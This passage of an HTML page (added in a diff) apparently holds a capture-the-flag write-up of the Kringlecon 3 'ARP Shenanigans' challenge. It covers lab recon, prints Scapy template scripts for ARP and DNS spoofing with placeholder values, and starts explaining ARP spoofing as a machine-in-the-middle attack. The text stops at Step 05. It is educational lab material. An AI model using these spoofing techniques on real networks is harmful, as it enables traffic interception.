@@ -1,0 +1,1212 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>Objective 09 - [Write-up] Kringlecon 3: French Hens</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.75751829.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#challenge-09-arp-shenanigans" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="[Write-up] Kringlecon 3: French Hens" class="md-header-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            [Write-up] Kringlecon 3: French Hens
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Objective 09
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="[Write-up] Kringlecon 3: French Hens" class="md-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    [Write-up] Kringlecon 3: French Hens
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../01-uncover-santas-gift-list/" class="md-nav__link">
+      Objective 01
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../02-investigate-s3-bucket/" class="md-nav__link">
+      Objective 02
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../03-point-of-sale-password-recovery/" class="md-nav__link">
+      Objective 03
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../04-operate-the-santavator/" class="md-nav__link">
+      Objective 04
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../05-open-hid-lock/" class="md-nav__link">
+      Objective 05
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../06-splunk-challenge/" class="md-nav__link">
+      Objective 06
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../07-can-d-bus-problem/" class="md-nav__link">
+      Objective 07
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../08-broken-tag-generator/" class="md-nav__link">
+      Objective 08
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Objective 09
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Objective 09
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Challenge
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weaponization" class="md-nav__link">
+    Weaponization
+  </a>
+  
+    <nav class="md-nav" aria-label="Weaponization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delivery" class="md-nav__link">
+    Delivery
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-installation" class="md-nav__link">
+    Exploitation &amp; Installation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c2" class="md-nav__link">
+    C2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../10-defeat-fingerprint-sensor/" class="md-nav__link">
+      Objective 10
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/33.6kbps/" class="md-nav__link">
+      Terminal/33.6kbps
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/can-bus-investigation/" class="md-nav__link">
+      Terminal/CAN Bus Investigations
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/debug-redis/" class="md-nav__link">
+      Terminal/Debug Redis
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/elf-code/" class="md-nav__link">
+      Terminal/Elf Code
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/kringle-kiosk/" class="md-nav__link">
+      Terminal/Kringle Kiosk
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/scapy-prepper/" class="md-nav__link">
+      Terminal/Scapy Prepper
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/snowball-fight/" class="md-nav__link">
+      Terminal/Snowball Fight
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/sort-o-matic/" class="md-nav__link">
+      Terminal/Sort-O-Matic
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/speaker-unprep/" class="md-nav__link">
+      Terminal/Speaker Unprep
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/unescape-tmux/" class="md-nav__link">
+      Terminal/Unescape Tmux
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Challenge
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weaponization" class="md-nav__link">
+    Weaponization
+  </a>
+  
+    <nav class="md-nav" aria-label="Weaponization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delivery" class="md-nav__link">
+    Delivery
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-installation" class="md-nav__link">
+    Exploitation &amp; Installation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c2" class="md-nav__link">
+    C2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="challenge-09-arp-shenanigans">Challenge 09 - ARP Shenanigans</h1>
+<h2 id="challenge">Challenge</h2>
+<pre><code>Difficulty: 4/5
+
+Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at 
+/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
+</code></pre>
+<h2 id="shell">Shell</h2>
+<pre><code class="language-bash">Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
+Help the North Pole by getting command line access back to this host.
+
+Read the HELP.md file for information to help you in this endeavor.
+
+Note: The terminal lifetime expires after 30 or more minutes so be 
+sure to copy off any essential work you have done as you go.
+
+guest@321e48198541:~$ 
+</code></pre>
+<h2 id="solution">Solution</h2>
+<p><em>Note:</em> changes from hostname are due to exiting and entering terminal</p>
+<h3 id="recon">Recon</h3>
+<h4 id="step-01">Step 01</h4>
+<p>Let's first see what kind of environment we're working with.</p>
+<pre><code class="language-bash">guest@21925e0c7e13:~$ ll
+total 40
+drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ./
+drwxr-xr-x 1 root  root  4096 Nov 30 18:57 ../
+-rw-r--r-- 1 guest guest  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 guest guest 3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 guest guest  807 Feb 25  2020 .profile
+-rw-r--r-- 1 guest guest  830 Dec  5 00:00 HELP.md
+drwxr-xr-x 1 guest guest 4096 Dec  7 21:11 debs/
+lrwxrwxrwx 1 guest guest    9 Dec  7 21:11 motd -&gt; /etc/motd
+drwxr-xr-x 1 guest guest 4096 Dec  1 15:27 pcaps/
+drwxr-xr-x 1 guest guest 4096 Dec  7 21:11 scripts/
+guest@21925e0c7e13:~$ ifconfig
+eth0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
+        inet 10.6.0.4  netmask 255.255.0.0  broadcast 10.6.255.255
+        ether 02:42:0a:06:00:04  txqueuelen 0  (Ethernet)
+        RX packets 34  bytes 1748 (1.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+guest@21925e0c7e13:~$ ping 10.6.6.35
+PING 10.6.6.35 (10.6.6.35) 56(84) bytes of data.
+64 bytes from 10.6.6.35: icmp_seq=1 ttl=64 time=0.169 ms
+64 bytes from 10.6.6.35: icmp_seq=2 ttl=64 time=0.097 ms
+64 bytes from 10.6.6.35: icmp_seq=3 ttl=64 time=0.091 ms
+64 bytes from 10.6.6.35: icmp_seq=4 ttl=64 time=0.094 ms
+64 bytes from 10.6.6.35: icmp_seq=5 ttl=64 time=0.111 ms
+^C
+--- 10.6.6.35 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4076ms
+rtt min/avg/max/mdev = 0.091/0.112/0.169/0.029 ms
+guest@21925e0c7e13:~$ cd debs/; ll
+total 2556
+drwxr-xr-x 1 guest guest    4096 Dec  7 21:11 ./
+drwxr-xr-x 1 guest guest    4096 Jan 11 00:03 ../
+-rw-r--r-- 1 guest guest   94748 Dec  5 00:00 gedit-common_3.36.1-1_all.deb
+-rw-r--r-- 1 guest guest   14484 Dec  5 00:00 golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
+-rw-r--r-- 1 guest guest  269332 Dec  5 00:00 nano_4.8-1ubuntu1_amd64.deb
+-rw-r--r-- 1 guest guest   61504 Dec  5 00:00 netcat-traditional_1.10-41.1ubuntu1_amd64.deb
+-rw-r--r-- 1 guest guest 1662268 Dec  5 00:00 nmap_7.80+dfsg1-2build1_amd64.deb
+-rw-r--r-- 1 guest guest  322680 Dec  5 00:00 socat_1.7.3.3-2_amd64.deb
+-rw-r--r-- 1 guest guest  168956 Dec  5 00:00 unzip_6.0-25ubuntu1_amd64.deb
+guest@21925e0c7e13:~/debs$ cd ../scripts/; ll
+total 16
+drwxr-xr-x 1 guest guest 4096 Dec  7 21:11 ./
+drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../
+-rwxr-xr-x 1 guest guest 1290 Dec  4 21:34 arp_resp.py*
+-rwxr-xr-x 1 guest guest 1526 Dec  7 21:10 dns_resp.py*
+guest@21925e0c7e13:~/scripts$ cd ../pcaps/; ll
+total 16
+drwxr-xr-x 1 guest guest 4096 Dec  1 15:27 ./
+drwxr-xr-x 1 guest guest 4096 Jan 11 00:03 ../
+-rw-r--r-- 1 guest guest  176 Nov 30 18:23 arp.pcap
+-rwxr-xr-x 1 guest guest  220 Nov 30 18:23 dns.pcap*
+guest@21925e0c7e13:~/pcaps$ 
+</code></pre>
+<p>So it looks like we have a bunch of traditional text editing tools, some utility tools, and some networking tools. We also have couple address resolution/domain name scripts and pcaps. We're also able to send ICMP packets to our target, so we should be able to start scanning it to see what we're dealing with.</p>
+<h4 id="step-02">Step 02</h4>
+<p>Let's see what tools we can use</p>
+<pre><code class="language-bash">guest@21925e0c7e13:~$ apt install debs/nmap_7.80+dfsg1-2build1_amd64.deb 
+E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
+guest@21925e0c7e13:~$ find / -name *nmap* 2&gt; /dev/null
+/home/guest/debs/nmap_7.80+dfsg1-2build1_amd64.deb
+/usr/local/lib/python3.8/dist-packages/scapy/modules/nmap.py
+/usr/local/lib/python3.8/dist-packages/scapy/modules/__pycache__/nmap.cpython-38.pyc
+/proc/sys/vm/min_unmapped_ratio
+guest@2f062415b43e:~$ which nc
+/usr/bin/nc
+guest@2f062415b43e:~$ which python
+guest@2f062415b43e:~$ which python3
+/usr/bin/python3
+guest@2f062415b43e:~$ which pip3
+/usr/bin/pip3
+guest@2f062415b43e:~$ which tcpdump
+/usr/sbin/tcpdump
+guest@2f062415b43e:~$ which wireshark
+guest@2f062415b43e:~$ which tshark
+/usr/bin/tshark
+guest@2f062415b43e:~$ cat scripts/arp_resp.py 
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+# Our eth0 ip
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our eth0 mac address
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+def handle_arp_packets(packet):
+    # if arp request, then we need to fill this out to send back our mac as the response
+    if ARP in packet and packet[ARP].op == 1:
+        ether_resp = Ether(dst=&quot;SOMEMACHERE&quot;, type=0x806, src=&quot;SOMEMACHERE&quot;)
+        arp_response = ARP(pdst=&quot;SOMEMACHERE&quot;)
+        arp_response.op = 99999
+        arp_response.plen = 99999
+        arp_response.hwlen = 99999
+        arp_response.ptype = 99999
+        arp_response.hwtype = 99999
+        arp_response.hwsrc = &quot;SOMEVALUEHERE&quot;
+        arp_response.psrc = &quot;SOMEVALUEHERE&quot;
+        arp_response.hwdst = &quot;SOMEVALUEHERE&quot;
+        arp_response.pdst = &quot;SOMEVALUEHERE&quot;
+        response = ether_resp/arp_response
+        sendp(response, iface=&quot;eth0&quot;)
+def main():
+    # We only want arp requests
+    berkeley_packet_filter = &quot;(arp[6:2] = 1)&quot;
+    # sniffing for one packet that will be sent to a function, while storing none
+    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
+if __name__ == &quot;__main__&quot;:
+    main()guest@2f062415b43e:~$ 
+guest@2f062415b43e:~$ 
+guest@2f062415b43e:~$ cat scripts/dns_resp.py 
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+# Our eth0 IP
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our Mac Addr
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
+# destination ip we arp spoofed
+ipaddr_we_arp_spoofed = &quot;10.6.1.10&quot;
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    eth = Ether(src=&quot;00:00:00:00:00:00&quot;, dst=&quot;00:00:00:00:00:00&quot;)   # need to replace mac addresses
+    ip  = IP(dst=&quot;0.0.0.0&quot;, src=&quot;0.0.0.0&quot;)                          # need to replace IP addresses
+    udp = UDP(dport=99999, sport=99999)                             # need to replace ports
+    dns = DNS(
+        # MISSING DNS RESPONSE LAYER VALUES 
+    )
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface=&quot;eth0&quot;)
+def main():
+    berkeley_packet_filter = &quot; and &quot;.join( [
+        &quot;udp dst port 53&quot;,                              # dns
+        &quot;udp[10] &amp; 0x80 = 0&quot;,                           # dns request
+        &quot;dst host {}&quot;.format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
+        &quot;ether dst host {}&quot;.format(macaddr)             # our macaddress since we spoofed the ip to our mac
+    ] )
+    # sniff the eth0 int without storing packets in memory and stopping after one dns request
+    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=&quot;eth0&quot;, count=1)
+if __name__ == &quot;__main__&quot;:
+    main()
+guest@2f062415b43e:~$ 
+</code></pre>
+<p>Given the challenges tools, we're probably on the same LAN as the target. Therefore, we can sniff some packets to see what the target is sending and receiving.</p>
+<h4 id="step-03">Step 03</h4>
+<p>Let's capture some packets to see what's going on.</p>
+<pre><code class="language-bash">guest@213231b7d960:~$ tshark -n -i eth0 -c 10
+Capturing on 'eth0'
+    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    2 1.039973169 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    3 2.071938986 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    4 3.115916416 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    5 4.147991531 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    6 5.179945590 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    7 6.211994280 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    8 7.243910002 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+    9 8.299962238 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+   10 9.339999466 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+10 packets captured
+guest@213231b7d960:~$ 
+</code></pre>
+<h4 id="step-04">Step 04</h4>
+<p>Let's load the pcaps to see what we can find out about the target.</p>
+<pre><code class="language-bash">guest@2f062415b43e:~$ python3
+Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
+[GCC 9.3.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; from scapy.all import *
+&gt;&gt;&gt; 
+&gt;&gt;&gt; arp_cap = rdpcap('pcaps/arp.pcap')
+&gt;&gt;&gt; dns_cap = rdpcap('pcaps/dns.pcap')
+&gt;&gt;&gt; 
+&gt;&gt;&gt; arp_cap.show()
+0000 Ether / ARP who has 10.10.10.1 says 10.10.10.2 / Padding
+0001 Ether / ARP is at cc:00:10:dc:00:00 says 10.10.10.1 / Padding
+&gt;&gt;&gt; 
+&gt;&gt;&gt; dns_cap.show()
+0000 Ether / IP / UDP / DNS Qry &quot;b'www.netbsd.org.'&quot; 
+0001 Ether / IP / UDP / DNS Ans &quot;204.152.190.12&quot; 
+&gt;&gt;&gt; 
+&gt;&gt;&gt; arp_cap[0][ARP]
+&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=cc:01:10:dc:00:00 psrc=10.10.10.2 hwdst=00:00:00:00:00:00 pdst=10.10.10.1 
+|&lt;Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;
+&gt;&gt;&gt; 
+&gt;&gt;&gt; arp_cap[1][ARP]
+&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=cc:00:10:dc:00:00 psrc=10.10.10.1 hwdst=cc:01:10:dc:00:00 pdst=10.10.10.2 |&lt;
+Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;
+</code></pre>
+<p>The pcaps don' appear to tell us anything about the target. Therefore, we'll probably need to spoof the ARP to get more info about the target.</p>
+<h4 id="step-05">Step 05</h4>
+<p>ARP spoofing is a Machine in the Middle (MitM) attack that allows us to be the machine in the middle of two devices on a network: a gateway (e.g. router) and a target. To fool both, we'll use the ARP protocol to associate our MAC address with each of the devices destination MAC address so that they connect to us instead of each other.</p>
+<p>First, we need to get the target's MAC address.</p>
